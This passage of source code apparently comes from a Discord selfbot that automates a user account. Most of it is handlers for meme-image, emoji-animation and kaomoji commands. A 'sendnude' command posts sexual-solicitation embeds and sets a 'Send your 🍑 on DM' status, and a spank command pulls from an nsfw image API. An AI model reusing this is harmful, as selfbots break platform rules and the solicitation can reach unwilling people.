                let img = await Nekow.generate("tweet", 
                {
                    text: text,
                    username: user.username
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "whowouldwin")
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(`${language.ERROR_COMMANDS_NEED_MENTION_NOTIF}`)
            whowouldwin();

            async function whowouldwin() 
            {
                let img = await Nekow.generate("whowouldwin", 
                {
                    user1: client.user.avatarURL,
                    user2: user.avatarURL
                });

                sleep(1000);

                let embed = new Discord.RichEmbed()
                .setColor(color)
                .setImage(img)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`)
                embed.setTimestamp();
                message.channel.send(embed);
            }
        }

        if (cmd === "sendnude")
        {
            var random_nudeimg = ["https://i.imgur.com/uz9HPEU.png", "https://i.imgur.com/yasFVqz.jpg", "https://i.imgur.com/YXmmtSZ.mp4", "https://i.imgur.com/Q89Z2vp.png", "https://i.imgur.com/dHqxKeA.jpg", "https://i.imgur.com/5ACuk6V.png", "https://i.imgur.com/x4CCpJi.jpg", "https://i.imgur.com/MCj8SsK.png", "https://i.imgur.com/b1zgFMM.jpg", "https://i.imgur.com/LyGKoEN.jpg", "https://i.imgur.com/23kI7CE.jpg", "https://i.imgur.com/nvFExTD.jpg", "https://i.imgur.com/fl0X0my.png", "https://i.imgur.com/RC2EMDt.png", "https://i.imgur.com/c41ubO7.jpg", "https://i.imgur.com/8ZsIe9I.png", "https://i.imgur.com/yos39S9.png", "https://i.imgur.com/TviTKFx.png"][Math.floor(Math.random() * 18)]
            message.delete()

            let embed = new Discord.RichEmbed()
            .setTitle("**Send nudes pls :3**")
            .setColor(color)
            .setImage(random_nudeimg)
            .setFooter('🌸 Sayonara | Made By Misakiii 🌸');
            embed.setTimestamp();
            message.channel.send(embed);

            var random_statenudeimg = ["sendnude1", "sendnude2", "sendnude3", "sendnude4"][Math.floor(Math.random() * 4)]

            rpcGenerator.getRpcImage("827143047611285516", random_statenudeimg)
                .then(image => 
                    {
                    let presence = new rpcGenerator.Rpc()
                        .setName("Send your 🍑 on DM :3")
                        .setUrl("https://twitch.tv/misakiii_")
                        .setType("STREAMING")
                        .setApplicationId("827143047611285516")
                        .setAssetsLargeImage(image.id)
                        .setAssetsLargeText("Send your 🍑 on DM :3")
                        .setState("𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝙗𝙤𝙩")

                    client.user.setPresence(presence.toDiscord())
                }).catch(console.error)
        }

        if (cmd === "countdown")
        {
            setTimeout(function() 
            {
              message.edit("1")
            }, 1000)

            setTimeout(function() 
            {
                message.edit("2")
            }, 2000)

            setTimeout(function() 
            {
                message.edit("3")
            }, 3000)

            setTimeout(function() 
            {
                message.edit("4")
            }, 4000)

            setTimeout(function() 
            {
                message.edit("5")
            }, 5000)

            setTimeout(function() 
            {
                message.edit("6")
            }, 6000)

            setTimeout(function() 
            {
                message.edit("7")
            }, 7000)

            setTimeout(function() 
            {
                message.edit("8")
            }, 8000)

            setTimeout(function() 
            {
                message.edit("9")
            }, 9000)

            setTimeout(function() 
            {
                message.edit(":middle_finger:")
            }, 10000)
        }

        if (cmd === "approved")
        {
            message.delete()
            const user = message.mentions.users.first()  
            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Approved();

            async function Approved() 
            {
                let image = AmeAPI.generate("approved", 
                {
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "approved.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "3000years")
        {
            message.delete()
            const user = message.mentions.users.first()  
            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            years();

            async function years() 
            {
                let image = AmeAPI.generate("3000years", 
                {
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "3000years.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "afusion")
        {
            message.delete()
            const user = message.mentions.users.first()  
            let URL = args.slice(1).join(" "); 

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            if (!URL) return DoNotif(language.ERROR_COMMANDS_EMPTYURL_NOTIF)

            afusion();

            async function afusion() 
            {
                let image = AmeAPI.generate("afusion", 
                {
                    "avatar": user.avatarURL,
                    "url": URL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "afusion.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "batslap")
        {
            message.delete()
            const user = message.mentions.users.first()  
            let URL = args.slice(1).join(" "); 

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            if (!URL) return DoNotif(language.ERROR_COMMANDS_EMPTYURL_NOTIF)

            batslap();

            async function batslap() 
            {
                let image = AmeAPI.generate("batslap", 
                {
                    "avatar": URL,
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "batslap.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "blur")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            blur();

            async function blur() 
            {
                let image = AmeAPI.generate("blur", 
                {
                    "blur": 3,
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "blur.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "brazzers")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            brazzers();

            async function brazzers() 
            {
                let image = AmeAPI.generate("brazzers", 
                {
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "brazzers.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "burn")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            burn();

            async function burn() 
            {
                let image = AmeAPI.generate("burn", 
                {
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "burn.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "challenger")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            challenger();

            async function challenger() 
            {
                let image = AmeAPI.generate("challenger", 
                {
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "challenger.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "contrast")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            contrast();

            async function contrast() 
            {
                let image = AmeAPI.generate("contrast", 
                {
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "contrast.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "crush")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            crush();

            async function crush() 
            {
                let image = AmeAPI.generate("crush", 
                {
                    "url": user.avatarURL
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "crush.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "facebook")
        {
            message.delete()
            const user = message.mentions.users.first()  
            let msg = args.slice(1).join(" ");

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            if (!msg) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF);

            facebook();

            async function facebook() 
            {
                let image = AmeAPI.generate("facebook", 
                {
                    "url": user.avatarURL,
                    "text": msg
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "facebook.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "dictator")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            dictator();

            async function dictator() 
            {
                let image = AmeAPI.generate("dictator", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "dictator.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "fire")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            fire();

            async function fire() 
            {
                let image = AmeAPI.generate("fire", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "fire.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "gay")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            gay();

            async function gay() 
            {
                let image = AmeAPI.generate("gay", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "gay.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "jail")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            jail();

            async function jail() 
            {
                let image = AmeAPI.generate("jail", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "jail.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "PS4")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            ps4();

            async function ps4() 
            {
                let image = AmeAPI.generate("ps4", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "ps4.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "rejected")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            rejected();

            async function rejected() 
            {
                let image = AmeAPI.generate("rejected", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "rejected.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "rip")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            rip();

            async function rip() 
            {
                let image = AmeAPI.generate("rip", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "rip.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "scary")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            scary();

            async function scary() 
            {
                let image = AmeAPI.generate("scary", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "scary.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "sniper")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            sniper();

            async function sniper() 
            {
                let image = AmeAPI.generate("sniper", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "sniper.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "tobecontinued")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            tobecontinued();

            async function tobecontinued() 
            {
                let image = AmeAPI.generate("tobecontinued", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "tobecontinued.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "subzero")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            subzero();

            async function subzero() 
            {
                let image = AmeAPI.generate("subzero", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "subzero.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "triggered")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            triggered();

            async function triggered() 
            {
                let image = AmeAPI.generate("triggered", 
                {
                    "blur": false,
                    "greyscale": false,
                    "horizontal": false,
                    "invert": false,
                    "sepia": false,
                    "vertical": false,
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "triggered.gif"
                        }]
                    })
                })
            }
        }

        if (cmd === "utatoo")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            utatoo();

            async function utatoo() 
            {
                let image = AmeAPI.generate("utatoo", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "utatoo.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "wanted")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            wanted();

            async function wanted() 
            {
                let image = AmeAPI.generate("wanted", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "wanted.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "wasted")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            wasted();

            async function wasted() 
            {
                let image = AmeAPI.generate("wasted", 
                {
                    "url": user.avatarURL,
                }).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "wasted.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "hitler")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            hitler();

            async function hitler() 
            {
                let image = await Canvacord.Canvas.hitler(user.avatarURL).then(image => 
                    {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "hitler.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "beautiful")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            beautiful();

            async function beautiful() 
            {
                let image = await Canvacord.Canvas.beautiful(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "beautiful.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "affect")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            affect();

            async function affect() 
            {
                let image = await Canvacord.Canvas.affect(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "affect.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "animefacepalm")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            if (!URL) return DoNotif(language.ERROR_COMMANDS_EMPTYURL_NOTIF)

            facepalm();

            async function facepalm() 
            {
                let image = await Canvacord.Canvas.facepalm(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "facepalm.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "react")
        {
            message.delete()
            let text = args.slice(0).join(" ");

            if (!text) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)

            message.channel.send(text).then(function(message) 
            {
                message.react("🍁")
                message.react("🌲")
                message.react("☄️")
                message.react("🍰")
                message.react("❄️")
                message.react("🔥")
                message.react("🌪")
                message.react("🌸")
                message.react("🌹")
                message.react("🍣")
                message.react("🧃")
                message.react("🌌")
                message.react("💊")
                message.react("💉")
                message.react("🩸")
                message.react("🔪")
                message.react("🧸")
                message.react("🎀")
                message.react("❤️")
                message.react("🔰")
            })
        }

        if (cmd === "dance")
        {
            setTimeout(function() {
                message.edit("`> (°□°）>`")
            }, 1000)
            setTimeout(function() {
                message.edit("`^ (°□°）^`")
            }, 3000)
            setTimeout(function() {
                message.edit("`< (°□°）<`")
            }, 5000)
            setTimeout(function() {
                message.edit("`v (°□°）v`")
            }, 7000)
            setTimeout(function() {
                message.edit("`> (°□°）>`")
            }, 9000)
            setTimeout(function() {
                message.edit("`^ (°□°）^`")
            }, 11000)
            setTimeout(function() {
                message.edit("`< (°□°）<`")
            }, 13000)
            setTimeout(function() {
                message.edit("`v (°□°）v`")
            }, 15000)
            setTimeout(function() {
                message.delete()
            }, 17000)
        }

        if (cmd === "suicide") 
        {
            setTimeout(function() {
                message.edit(":sob: :gun:")
            }, 1000)
            setTimeout(function() {
                message.edit(":boom:")
            }, 3000)
            setTimeout(function() {
                message.edit(":skull:")
            }, 5000)
            setTimeout(function() {
                message.delete()
            }, 8000)
        }

        if (cmd == "kiss")
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            snekfetch.get('https://neko-love.xyz/api/v1/kiss').then(r => 
            {
                var huging = r.body.url

                var embed = new Discord.RichEmbed()
                    .setTitle(`${message.author.username} **give a kiss to** ${user.username}`)
                    .setDescription('')
                    .setImage(huging)
                    .setColor(color)
                message.channel.send(embed);
            }).catch(err => {})
        }

        if (cmd === "love")
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            var rdmimages = ['https://i.imgur.com/1pdOriM.gif', 'https://i.imgur.com/npluXQZ.gif', 'https://i.imgur.com/zuc2z4U.gif', 'https://i.imgur.com/kG8sdwj.gif', 'https://i.imgur.com/ue8D4V2.gif', 'https://i.imgur.com/vAUg2Ym.gif', 'https://i.imgur.com/3nyYxoT.gif', 'https://i.imgur.com/S0e6S3b.gif', 'https://i.imgur.com/xTlb1jU.gif'][Math.floor(Math.random() * 9)]

                var embed = new Discord.RichEmbed()
                    .setTitle(`${message.author.username} ** loves ${user.username} so much !! ** ❤️❤️❤️❤️❤️`)
                    .setDescription('')
                    .setImage(rdmimages)
                    .setColor(color)
                message.channel.send(embed);
        }

        if (cmd === "spank")
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            async function work() 
            {
                let owo = (await neko.nsfw.spank());
        
                const embed = new Discord.RichEmbed()
                .setTitle(`${message.author.username} ** give a spank to ** ${user.username}`)
                .setImage(owo.url)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                .setTimestamp()
                message.channel.send(embed);
            }

            work();
        }

        if (cmd === "calcul") 
        {
            const question = args.join(" ");
            message.delete()

            if (!question) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF)

            let answer;
            try 
            {
                answer = math.eval(question);
            } catch (err) 
            {
                console.error(`Invalid math equation: ${err}`);
            }

            message.channel.send("The result is: ***" + answer + "***")
        }

        if (cmd === "hug") 
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            snekfetch.get('https://some-random-api.ml/animu/hug').then(r => 
            {
                var huging = r.body.link

                var embed = new Discord.RichEmbed()
                    .setTitle(`${client.user.username} *give a big hug to* ${user.username}`)
                    .setDescription('')
                    .setImage(huging)
                    .setColor(color)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                message.channel.send(embed);
            }).catch(err => {})
        }

        if (cmd === "pat") 
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            snekfetch.get('https://some-random-api.ml/animu/pat').then(r => 
            {
                var Pat = r.body.link

                var embed = new Discord.RichEmbed()
                    .setTitle(`${client.user.username} *pat pat* ${user.username}`)
                    .setDescription('')
                    .setImage(Pat)
                    .setColor(color)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                message.channel.send(embed);
            }).catch(err => {})
        }

        if (cmd === "wink")
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            snekfetch.get('https://some-random-api.ml/animu/wink').then(r => 
            {
                var wink = r.body.link

                var embed = new Discord.RichEmbed()
                    .setTitle(`${client.user.username} *wink to* ${user.username}`)
                    .setDescription('')
                    .setImage(wink)
                    .setColor(color)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                message.channel.send(embed);
            }).catch(err => {})
        }

        if (cmd === "sus")
        {
            const user = message.mentions.users.first()  
            message.delete()

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);
            
            var result = [`**Emergency Meeting** ${user.username} IS SUS ඞ`, "Ok everything is fine.. for now..", "I guess red is sus..", `vote ${user.username}`][Math.floor(Math.random() * 4)]

            var embed = new Discord.RichEmbed()
                .setTitle(`Sus Detection`)
                .setDescription(result)
                .setColor(color)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
            message.channel.send(embed);
        }

        if (cmd === "stonk")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            stonk();

            async function stonk() 
            {
                let image = await new DIG.Stonk().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "stonk.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "montage")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Ad();

            async function Ad() 
            {
                let image = await new DIG.Ad().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Ad.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "affectmybaby")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Affect();

            async function Affect() 
            {
                let image = await new DIG.Affect().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Affect.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "paintart")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Bobross();

            async function Bobross() 
            {
                let image = await new DIG.Bobross().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Bobross.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "deletetrash")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Delete();

            async function Delete() 
            {
                let image = await new DIG.Delete().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Delete.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "lisapresentation")
        {
            message.delete()
            var mess = args.join(" ");

            if (!mess) return DoNotif(language.ERROR_COMMANDS_EMPTYMSG_NOTIF);

            LisaPresentation();

            async function LisaPresentation() 
            {
                let image = await new DIG.LisaPresentation().getImage(mess).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "LisaPresentation.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "m&m's")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Mms();

            async function Mms() 
            {
                let image = await new DIG.Mms().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Mms.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "notstonk")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            NotStonk();

            async function NotStonk() 
            {
                let image = await new DIG.NotStonk().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "NotStonk.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "poutine")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Poutine();

            async function Poutine() 
            {
                let image = await new DIG.Poutine().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Poutine.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "restinpeace")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Rip();

            async function Rip() 
            {
                let image = await new DIG.Rip().getImage(user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Rip.png"
                        }]
                    })
                })
            }
        }

        if (cmd === "giveaspank")
        {
            message.delete()
            const user = message.mentions.users.first()  

            if (!user) return DoNotif(language.ERROR_COMMANDS_NEED_MENTION_NOTIF);

            Spank();

            async function Spank() 
            {
                let image = await new DIG.Spank().getImage(client.user.avatarURL, user.avatarURL).then(image => 
                {
                    message.channel.send({
                        files: [{
                            attachment: image,
                            name: "Spank.png"
                        }]
                    })
                })
            }
        }



        //#endregion



        //#region > SYMBOLES MENU & OPTIONS

        if (cmd === "symbols") 
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙎𝙮𝙢𝙗𝙤𝙡𝙨」" + random_emojis + " <<」**")
                .setColor(color)
                .addField("**```" + prefix + "symbols1 ```**", "***( ͡° ͜ʖ ͡°)***")
                .addField("**```" + prefix + "symbols2 ```**", "***> (°□°）>͡***")
                .addField("**```" + prefix + "symbols3 ```**", "***0_o***")
                .addField("**```" + prefix + "symbols4 ```**", "***╭∩╮（︶︿︶）╭∩╮***")
                .addField("**```" + prefix + "symbols5 ```**", "***┻━┻︵ \(°□°)/ ︵ ┻━┻***")
                .addField("**```" + prefix + "symbols6 ```**", "***(╯°□°）╯︵ ┻━┻***")
                .addField("**```" + prefix + "symbols7 ```**", "***┬──┬ ノ( ゜-゜ノ)***")
                .addField("**```" + prefix + "symbols8 ```**", "***༼ つ ◕_◕ ༽つ***")
                .addField("**```" + prefix + "symbols9 ```**", "***(ಠ_ಠ)***")
                .addField("**```" + prefix + "symbols10 ```**", "***[̲̅$̲̅(̲̅ιοο̲̅)̲̅$̲̅]***")
                .addField("**```" + prefix + "symbols11 ```**", "***(′ʘ⌄ʘ‵)***")
                .addField("**```" + prefix + "symbols12 ```**", "***'=͟͟͞͞( ✌°∀° )☛***")
                .addField("**```" + prefix + "symbols13 ```**", "***(＾▽＾)***")
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            consolelog("information", `${language.DEBUG_LOG_SYMBOLS_SEND}.`)
        }

        if (cmd === "symbols1")
        {
            message.delete()
            message.channel.send("( ͡° ͜ʖ ͡°)")
        }

        if (cmd === "symbols2")
        {
            message.delete()
            message.channel.send("> (°□°）>͡")
        }

        if (cmd === "symbols3")
        {
            message.delete()
            message.channel.send("0_o")
        }

        if (cmd === "symbols4")
        {
            message.delete()
            message.channel.send("╭∩╮（︶︿︶）╭∩╮")
        }

        if (cmd === "symbols5")
        {
            message.delete()
            message.channel.send("┻━┻︵ \(°□°)/ ︵ ┻━┻")
        }

        if (cmd === "symbols6")
        {
            message.delete()
            message.channel.send("(╯°□°）╯︵ ┻━┻")
        }

        if (cmd === "symbols7")
        {
            message.delete()
            message.channel.send("┬──┬ ノ( ゜-゜ノ)")
        }

        if (cmd === "symbols8")
        {
            message.delete()
            message.channel.send("༼ つ ◕_◕ ༽つ")
        }

        if (cmd === "symbols9")
        {
            message.delete()
            message.channel.send("(ಠ_ಠ)")
        }

        if (cmd === "symbols10")
        {
            message.delete()
            message.channel.send("[̲̅$̲̅(̲̅ιοο̲̅)̲̅$̲̅]")
        }

        if (cmd === "symbols11")
        {
            message.delete()
            message.channel.send("(′ʘ⌄ʘ‵)")
        }

        if (cmd === "symbols12")
        {
            message.delete()
            message.channel.send("'=͟͟͞͞( ✌°∀° )☛")
        }

        if (cmd === "symbols13")
        {
            message.delete()
            message.channel.send("(＾▽＾)")
        }

        //#endregion



        //#region > TEXT MENU & OPTIONS

        if (cmd === "text") 
        {
            message.delete()

            const textmenu = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙏𝙚𝙭𝙩」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "ascii + TEXT ```**", `***${language.ASCII_DESC}.***`)
